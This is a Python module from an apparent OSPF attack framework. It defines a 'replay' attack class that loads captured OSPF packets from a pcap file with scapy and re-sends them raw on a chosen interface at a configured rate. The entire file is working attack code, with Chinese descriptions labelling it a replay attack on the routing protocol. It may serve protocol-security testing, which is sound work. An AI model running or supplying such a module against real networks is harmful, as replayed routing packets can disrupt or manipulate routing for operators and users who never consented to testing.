from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import ReplayConfig
from ospf_attack.network.sender import PacketSender


class ReplayAttack(BaseAttack):
    name = "replay"
    description = "重放攻击：捕获合法 OSPF 报文后重新发送"
    category = AttackCategory.PROTOCOL
    config: ReplayConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        if not self.config.capture_file:
            return AttackResult(
                success=False,
                packets_sent=0,
                target_affected=False,
                details="重放攻击需要 capture_file 参数",
            )
        try:
            from scapy.all import rdpcap
            packets = rdpcap(self.config.capture_file)
        except Exception as e:
            return AttackResult(
                success=False,
                packets_sent=0,
                target_affected=False,
                details=f"读取 pcap 失败: {e}",
            )
        for pkt in packets:
            self._sender.send_raw(pkt)
        return AttackResult(
            success=True,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"重放: {self._sender.sent_count} packets replayed",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
